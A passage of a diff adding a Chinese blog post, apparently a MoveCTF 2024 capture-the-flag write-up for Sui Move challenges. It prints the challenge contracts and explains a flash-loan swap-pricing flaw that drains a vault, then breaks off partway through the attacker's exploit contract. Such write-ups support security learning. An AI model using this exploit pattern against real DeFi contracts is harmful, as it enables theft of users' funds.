@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>movectf_2024_wp | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="movectf 2024的部分题目wp">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/movectf-2024-wp/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" integrity="sha256-1yREUm1&#43;y9sAFUOKf6iQVKZYv3WdBULi5d&#43;BzpS0k&#43;4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/movectf-2024-wp/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      movectf_2024_wp
+    </h1>
+    <div class="post-description">
+      movectf 2024的部分题目wp
+    </div>
+    <div class="post-meta"><span title='2024-01-13 08:48:17 +0000 UTC'>January 13, 2024</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h3 id="checkin">Checkin<a hidden class="anchor" aria-hidden="true" href="#checkin">#</a></h3>
+<blockquote>
+<p>sorce:100</p>
+</blockquote>
+<p>题目源码:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>module movectf::checkin {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::event;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::tx_context::{Self, TxContext};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">ESTRING</span>:<span style="color:#66d9ef">u64</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Flag</span> has copy, drop {
+</span></span><span style="display:flex;"><span>        sender: <span style="color:#a6e22e">address</span>,
+</span></span><span style="display:flex;"><span>        flag: <span style="color:#66d9ef">bool</span>,
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public entry fun get_flag(string: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span>, ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext) {
+</span></span><span style="display:flex;"><span>        assert!(string <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;MoveBitCTF&#34;</span>,<span style="color:#66d9ef">ESTRING</span>);
+</span></span><span style="display:flex;"><span>        event::emit(Flag {
+</span></span><span style="display:flex;"><span>            sender: <span style="color:#a6e22e">tx_context</span>::sender(ctx),
+</span></span><span style="display:flex;"><span>            flag: <span style="color:#a6e22e">true</span>,
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>带着MoveBitCTF字符串作为参数调用get_flag函数。传参要用字节。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 转换为十六进制</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;0x&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> <span style="color:#e6db74">&#34;MoveBitCTF&#34;</span>:
+</span></span><span style="display:flex;"><span>    print(hex(ord(i))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;0x&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span></code></pre></div><p>调用即可：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sui client call --package package_id --module module_name --function get_flag --args 0x4d6f7665426974435446 --gas-budget <span style="color:#ae81ff">10000000</span>
+</span></span></code></pre></div><h3 id="dynamicmatrixtraversal">DynamicMatrixTraversal<a hidden class="anchor" aria-hidden="true" href="#dynamicmatrixtraversal">#</a></h3>
+<blockquote>
+<p>sorce: 200</p>
+</blockquote>
+<p>关键代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>    public entry fun execute(record: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Record, m: <span style="color:#66d9ef">u64</span>, n: <span style="color:#66d9ef">u64</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (record.count_1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> result: <span style="color:#66d9ef">u64</span> <span style="color:#f92672">=</span> up(m, n);
+</span></span><span style="display:flex;"><span>            assert!(result <span style="color:#f92672">==</span> <span style="color:#66d9ef">TARGET_VALUE_1</span>, <span style="color:#66d9ef">ERROR_RESULT_1</span>);
+</span></span><span style="display:flex;"><span>            record.count_1 <span style="color:#f92672">=</span> m;
+</span></span><span style="display:flex;"><span>            record.count_2 <span style="color:#f92672">=</span> n;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (record.count_3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> result: <span style="color:#66d9ef">u64</span> <span style="color:#f92672">=</span> up(m, n);
+</span></span><span style="display:flex;"><span>            assert!(result <span style="color:#f92672">==</span> <span style="color:#66d9ef">TARGET_VALUE_2</span>, <span style="color:#66d9ef">ERROR_RESULT_2</span>);
+</span></span><span style="display:flex;"><span>            record.count_3 <span style="color:#f92672">=</span> m;
+</span></span><span style="display:flex;"><span>            record.count_4 <span style="color:#f92672">=</span> n;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public entry fun get_flag(record: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">Record</span>, ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext) {
+</span></span><span style="display:flex;"><span>        assert!(record.count_1 <span style="color:#f92672">&lt;</span> record.count_3, <span style="color:#66d9ef">ERROR_PARAM_1</span>);
+</span></span><span style="display:flex;"><span>        assert!(record.count_2 <span style="color:#f92672">&gt;</span> record.count_4, <span style="color:#66d9ef">ERROR_PARAM_2</span>);
+</span></span><span style="display:flex;"><span>        event::emit(Flag { user: <span style="color:#a6e22e">tx_context</span>::sender(ctx), flag: <span style="color:#a6e22e">true</span> });
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>得到flag的条件是count_1 &lt; count_3且count_2 &gt; count_4。</p>
+<blockquote>
+<p>up函数使用动态规划根据输入参数m和n计算一个值。它使用一个向量的向量构建一个值的矩阵，并从矩阵的最后一行的最后一个元素中检索所需的值。</p>
+</blockquote>
+<p>让ai将up函数用python重写然后本地跑一下的到两组数据，3-169和5-89。
+通过execute函数去赋值（数字m和n传递时要转换成十六进制）。然后调用get_flag即可。</p>
+<h3 id="swap">Swap<a hidden class="anchor" aria-hidden="true" href="#swap">#</a></h3>
+<blockquote>
+<p>sorce: 200</p>
+</blockquote>
+<p>题目源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>module swap::vault{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::coin::{Self, Coin};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::tx_context::{Self, TxContext};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::balance::{Self, Balance};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::object::{Self, <span style="color:#66d9ef">ID</span>, <span style="color:#66d9ef">UID</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::transfer;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::event;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> swap::ctfa::{Self, MintA};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> swap::ctfb::{Self, MintB};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Vault</span><span style="color:#f92672">&lt;</span>phantom A, phantom B<span style="color:#f92672">&gt;</span> has key {
+</span></span><span style="display:flex;"><span>        id: <span style="color:#a6e22e">UID</span>,
+</span></span><span style="display:flex;"><span>        coin_a: <span style="color:#a6e22e">Balance</span><span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span>        coin_b: <span style="color:#a6e22e">Balance</span><span style="color:#f92672">&lt;</span>B<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span>        flashed: <span style="color:#66d9ef">bool</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Flag</span> has copy, drop {
+</span></span><span style="display:flex;"><span>        win: <span style="color:#66d9ef">bool</span>,
+</span></span><span style="display:flex;"><span>        sender: <span style="color:#a6e22e">address</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Receipt</span> {
+</span></span><span style="display:flex;"><span>        id: <span style="color:#a6e22e">ID</span>,
+</span></span><span style="display:flex;"><span>        a_to_b: <span style="color:#66d9ef">bool</span>,
+</span></span><span style="display:flex;"><span>        repay_amount: <span style="color:#66d9ef">u64</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public entry fun initialize<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(capa: <span style="color:#a6e22e">MintA</span><span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>, capb: <span style="color:#a6e22e">MintB</span><span style="color:#f92672">&lt;</span>B<span style="color:#f92672">&gt;</span>,ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> vault <span style="color:#f92672">=</span> Vault<span style="color:#f92672">&lt;</span>A, B<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>            id: <span style="color:#a6e22e">object</span>::new(ctx),
+</span></span><span style="display:flex;"><span>            coin_a: <span style="color:#a6e22e">coin</span>::into_balance(ctfa::mint_for_vault(capa, ctx)),
+</span></span><span style="display:flex;"><span>            coin_b: <span style="color:#a6e22e">coin</span>::into_balance(ctfb::mint_for_vault(capb, ctx)),
+</span></span><span style="display:flex;"><span>            flashed: <span style="color:#a6e22e">false</span>
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        transfer::share_object(vault);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun flash<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(vault: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Vault<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>, amount: <span style="color:#66d9ef">u64</span>, a_to_b: <span style="color:#66d9ef">bool</span>, ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext): (Coin<span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>, Coin<span style="color:#f92672">&lt;</span>B<span style="color:#f92672">&gt;</span>, Receipt) {
+</span></span><span style="display:flex;"><span>        assert!(<span style="color:#f92672">!</span>vault.flashed, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> (coin_a, coin_b) <span style="color:#f92672">=</span> <span style="color:#66d9ef">if</span> (a_to_b) {
+</span></span><span style="display:flex;"><span>        (coin::zero<span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>(ctx), coin::from_balance(balance::split(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_b, amount ), ctx))
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        (coin::from_balance(balance::split(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_a, amount ), ctx), coin::zero<span style="color:#f92672">&lt;</span>B<span style="color:#f92672">&gt;</span>(ctx))
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> receipt <span style="color:#f92672">=</span> Receipt {
+</span></span><span style="display:flex;"><span>            id: <span style="color:#a6e22e">object</span>::id(vault),
+</span></span><span style="display:flex;"><span>            a_to_b,
+</span></span><span style="display:flex;"><span>            repay_amount: <span style="color:#a6e22e">amount</span>
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        vault.flashed <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        (coin_a, coin_b, receipt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun repay_flash<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(vault: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Vault<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>, coina: <span style="color:#a6e22e">Coin</span><span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>, coinb: <span style="color:#a6e22e">Coin</span><span style="color:#f92672">&lt;</span>B<span style="color:#f92672">&gt;</span>, receipt: <span style="color:#a6e22e">Receipt</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> Receipt {
+</span></span><span style="display:flex;"><span>            id: <span style="color:#a6e22e">_</span>,
+</span></span><span style="display:flex;"><span>            a_to_b: <span style="color:#a6e22e">a2b</span>,
+</span></span><span style="display:flex;"><span>            repay_amount: <span style="color:#a6e22e">amount</span>
+</span></span><span style="display:flex;"><span>        } <span style="color:#f92672">=</span> receipt;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (a2b) {
+</span></span><span style="display:flex;"><span>            assert!(coin::value(<span style="color:#f92672">&amp;</span>coinb) <span style="color:#f92672">&gt;=</span> amount, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            assert!(coin::value(<span style="color:#f92672">&amp;</span>coina) <span style="color:#f92672">&gt;=</span> amount, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        balance::join(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_a, coin::into_balance(coina));
+</span></span><span style="display:flex;"><span>        balance::join(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_b, coin::into_balance(coinb));
+</span></span><span style="display:flex;"><span>        vault.flashed <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun swap_a_to_b<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(vault: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Vault<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>, coina:<span style="color:#a6e22e">Coin</span><span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>, ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext): <span style="color:#a6e22e">Coin</span><span style="color:#f92672">&lt;</span>B<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> amount_out_B <span style="color:#f92672">=</span> coin::value(<span style="color:#f92672">&amp;</span>coina) <span style="color:#f92672">*</span> balance::value(<span style="color:#f92672">&amp;</span>vault.coin_b) <span style="color:#f92672">/</span> balance::value(<span style="color:#f92672">&amp;</span>vault.coin_a);
+</span></span><span style="display:flex;"><span>            coin::put<span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_a, coina);
+</span></span><span style="display:flex;"><span>            coin::take(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_b, amount_out_B, ctx)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun swap_b_to_a<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(vault: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Vault<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>, coinb:<span style="color:#a6e22e">Coin</span><span style="color:#f92672">&lt;</span>B<span style="color:#f92672">&gt;</span>, ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext): <span style="color:#a6e22e">Coin</span><span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> amount_out_A <span style="color:#f92672">=</span> coin::value(<span style="color:#f92672">&amp;</span>coinb) <span style="color:#f92672">*</span> balance::value(<span style="color:#f92672">&amp;</span>vault.coin_a) <span style="color:#f92672">/</span> balance::value(<span style="color:#f92672">&amp;</span>vault.coin_b);
+</span></span><span style="display:flex;"><span>            coin::put<span style="color:#f92672">&lt;</span>B<span style="color:#f92672">&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_b, coinb);
+</span></span><span style="display:flex;"><span>            coin::take(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_a, amount_out_A, ctx)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun get_flag<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(vault: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">Vault</span><span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>, ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">TxContext</span>) {
+</span></span><span style="display:flex;"><span>        assert!(
+</span></span><span style="display:flex;"><span>            balance::value(<span style="color:#f92672">&amp;</span>vault.coin_a) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> balance::value(<span style="color:#f92672">&amp;</span>vault.coin_b) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">123</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        event::emit(
+</span></span><span style="display:flex;"><span>            Flag {
+</span></span><span style="display:flex;"><span>                win: <span style="color:#a6e22e">true</span>,
+</span></span><span style="display:flex;"><span>                sender: <span style="color:#a6e22e">tx_context</span>::sender(ctx)
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>ctfa和ctfb中定义了两种货币，不是重点，就不放源码了。</p>
+<p>提供了闪电贷和两种货币相互兑换的功能。</p>
+<h4 id="介绍一下闪电贷">介绍一下闪电贷<a hidden class="anchor" aria-hidden="true" href="#介绍一下闪电贷">#</a></h4>
+<p>源码中Receipt作为欠条，在用户贷款时发送给用户，由于其没有drop能力，所以交易结束之前如果没有被解包就会报错导致交易失败。    <br>
+repay_flash函数可以解包receipt。这就意味着贷款的借出和归还只能在一笔交易中进行，就是让你借出去拿这些钱去套利，然后马上还回来，如果不换或者换的不够交易就失败，这笔交易就不会写入链上。</p>
+<h4 id="题解">题解<a hidden class="anchor" aria-hidden="true" href="#题解">#</a></h4>
+<p>由于定义了vault.flashed变量，所以我们只能一次借一种货币且在未还清之前不能再借，所以我们要先将vault中某一种货币清空，再把另一种货币借空，然后调用get_flag，然后再还钱就可以了。</p>
+<p>swap_a_to_b和swap_b_to_a可以将两种货币相互兑换，兑换时按照比例进行兑换，但问题在于，兑换的比率没有考虑贷款。以swap_a_to_b为例：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>    public fun swap_a_to_b<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(vault: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Vault<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>, coina:<span style="color:#a6e22e">Coin</span><span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>, ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext): <span style="color:#a6e22e">Coin</span><span style="color:#f92672">&lt;</span>B<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// 传参vault为银行，coina为我们的A货币
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">let</span> amount_out_B <span style="color:#f92672">=</span> coin::value(<span style="color:#f92672">&amp;</span>coina) <span style="color:#f92672">*</span> balance::value(<span style="color:#f92672">&amp;</span>vault.coin_b) <span style="color:#f92672">/</span> balance::value(<span style="color:#f92672">&amp;</span>vault.coin_a);
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// 计算出可以兑换的B的数量，这里只考虑了vault内的余量，没有加上我们已经贷出去的。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            coin::put<span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_a, coina);
+</span></span><span style="display:flex;"><span>            coin::take(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> vault.coin_b, amount_out_B, ctx)
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>vault中初始有A,B各100个，攻击者初始拥有A,B各10个。</p>
+<ol>
+<li>我先借90个A</li>
+<li>在用10个A去换B，此时vault中 B/A = 10  ,所以10个A可以还100个B。</li>
+<li>在把90个A还回去。
+通过这三步操作，我们手上拥有110个B（10个本来拥有+vault中的100个）和0个A（10A换成了B）。而且此时所有的欠款均已还清。          <br>
+最后在把vault中的110个A借出来就可以了。</li>
+</ol>
+<h4 id="攻击合约">攻击合约:<a hidden class="anchor" aria-hidden="true" href="#攻击合约">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>module zoiltin_solve_swap::exp{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::coin::{Self,Coin};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::tx_context::{Self,TxContext};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::transfer;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::balance::{Self};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> swap::vault::{Self,Receipt};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public entry fun exp<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(bank: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> vault::Vault<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>,my_coin_a: <span style="color:#a6e22e">Coin</span><span style="color:#f92672">&lt;</span>A<span style="color:#f92672">&gt;</span>,ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext){
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 传参带进来vault和我们初始的10个A
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> (coin_a_1,coin_b_1,receipt_1) <span style="color:#f92672">=</span> vault::flash<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(bank,<span style="color:#ae81ff">90</span>,<span style="color:#66d9ef">false</span>,ctx);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 借90个A
